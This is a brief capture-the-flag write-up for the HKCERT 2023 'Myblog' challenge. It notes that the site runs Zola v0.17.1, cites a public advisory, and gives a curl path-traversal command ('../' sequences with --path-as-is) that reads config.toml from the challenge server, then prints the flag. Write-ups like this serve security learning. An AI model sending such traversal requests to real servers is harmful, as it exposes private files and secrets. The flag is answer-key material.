# Myblog

from the `Dockerfile` <br/>
it can be clearly seen that the website is built up with `zola`

```
$ cat Dockerfile         
FROM ghcr.io/getzola/zola:v0.17.1

COPY /project /project
WORKDIR /project
RUN ["zola", "build"]
EXPOSE 8080
ENTRYPOINT ["zola", "serve", "--interface", "0.0.0.0", "--port", "8080", "--base-url", "localhost"]
```

by search `zola vulnerabilities` on google <br/>
we can find this page https://github.com/advisories/GHSA-xvv9-5j67-3rpq <br/>
and this page also https://github.com/getzola/zola/issues/2257

execute this to get the flag

```bash
curl --path-as-is "http://chal.hkcert23.pwnable.hk:28338/../../../../../../../../../../project/config.toml" -vvv
```

flag: hkcert23{Which_ear_is_201A_stil_got_path_issuez}
